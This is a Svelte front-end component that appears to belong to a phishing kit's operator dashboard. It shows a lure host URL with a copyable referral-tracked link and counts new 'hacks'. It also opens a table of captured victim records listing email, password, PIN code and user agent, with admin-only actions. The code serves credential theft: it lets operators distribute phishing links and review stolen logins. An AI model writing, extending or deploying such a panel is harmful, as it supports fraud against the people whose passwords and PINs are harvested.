<script>
  import CopyButton from "./CopyButton.svelte";
  import DeviceIcon from "./DeviceIcon.svelte";
  import WebIcon from "./icons/WebIcon.svelte";
  import HackData from "./HackData.svelte";

  import moment from "moment";
  import { hacksList, user } from "$lib/stores/user-store";
  import { getUser, updateCheckpoint } from "$lib/users";
    import { detailsShow } from "$lib/stores/states";

  export let hostUrl;
  export let suffix;
  export let isShowHacker=false


  $: hacks = $hacksList;
  $: latesthacks = hacks.filter((el) => el.timestamp > $user.lastChecked);

  async function showhackView() {
    console.log("hacks to show", hacks, $hacksList);
    $detailsShow = true;
    await updateCheckpoint($user.uid);
    $user = await getUser($user.uid);
    localStorage.setItem("user", JSON.stringify($user));
  }
  function hidehackView() {
    $detailsShow = false;
  }
  function geturl(hoststring) {
    var url = hoststring.replace("_", ".");
    return url;
  }
</script>

<div class="item">
  <span class="left">
    <span class="text bolded">{geturl(hostUrl)}</span>
    <span class="text suffix">{suffix} </span>
    <CopyButton name={`${geturl(hostUrl)}/${suffix}?t=${$user.ref}`} />
  </span>
  <div class="meta">
    <div class="oneline">
      {#if latesthacks.length > 0}
        <div style="padding-right:10px;">
          <span class="label label-default mdc-typography--subtitle"
            >new {latesthacks.length}</span
          >
        </div>
      {/if}
      <div class="mdc-typography--headline6 smpadding">{hacks.length}</div>

        <button on:click={showhackView} class="notification"
          ><span> Hacks</span><svg
            xmlns="http://www.w3.org/2000/svg"
            width="16"
            height="16"
            viewBox="0 0 16 16"
            ><path
              fill="currentColor"
              d="M3.704 11.736a.75.75 0 1 0 1.092 1.028l4-4.25a.748.748 0 0 0 0-1.027l-4-4.25a.75.75 0 1 0-1.092 1.028L7.22 8zM11.25 3a.75.75 0 0 1 .75.75v8.5a.75.75 0 0 1-1.5 0v-8.5a.75.75 0 0 1 .75-.75"
            /></svg
          >
        </button>

    </div>
  </div>
</div>
{#if $detailsShow}
  <div class="fixed-popup">
    <div class="table-wrapper">

      <div class="close-bar">
        <div class="cl-left"></div>
        <div class="cl-right" on:click={hidehackView}>🗙</div>
      </div>
      <table>
        <tr>
          <th>Time</th>
  
          <th>Email</th>
          <th>Password</th>
          <th>Pin-code</th>
          <th>UserAgent</th>
          {#if $user.isAdmin}
            <th>Actions</th>
          {/if}
        </tr>
        {#each hacks as hack}
          <HackData {hack}/>
        {/each}
      </table>
    </div>
  </div>
{/if}

<style>
  .close-bar{
    display: flex;
    justify-content: space-between;
  }
  .cl-right{
    padding: 10px 20px;
    cursor: pointer;
    color: red;
    font-size: 20px;
  }
  .fixed-popup{
    position: fixed;
    width: 100%;
    height: calc(100% - 92px);
    display: flex;
    justify-content: center;
    top:92px;
    left: 0;
    overflow:auto;
    margin-top: 12px;
    
  }
  .bolded {
    font-weight: 600;
    color: #545353;
    font-size: 15px;
  }
  .left {
    padding: 8px 6px 8px 16px;
    display: flex;
    align-items: center;
    gap: 4px;
  }
  .suffix {
    font-size: 8px;
    padding: 2px 6px;
    border-radius: 3px;
    border: 1px solid rgb(181 151 151);
  }
  .table-wrapper{
    border: 2px solid rgba(128, 128, 128, 0.384);
    background-color: rgb(255, 255, 255);
    border-radius: 8px;

  }
  table {
    border-spacing: 8px;
    padding: 6px 12px;
  }
  th {
    text-align: start;
  }
  .item {
    display: flex;
    justify-content: space-between;
    padding-right: 16px;
    padding-top: 6px;
  }
  .meta {
    display: flex;
  }
  .oneline {
    display: flex;
    justify-content: space-between;
    align-items: center;
  }

  .label-default {
    background-color: red;
  }

  .label {
    display: flex;
    padding: 0.2em 0.35em 0.23em;
    font-size: 90%;
    font-weight: 700;
    line-height: 1;
    color: #fff;
    text-align: center;
    white-space: nowrap;
    border-radius: 0.25em;
  }

  .notification {
    background-color: #555;
    color: white;
    display: flex;
    align-items: center;
    gap: 2px;
    border-radius: 3px;
    padding-right: 2px;
  }

  .notification:hover {
    background: rgb(7, 7, 7);
  }

  .smpadding {
    padding: 0px 6px;
  }
</style>
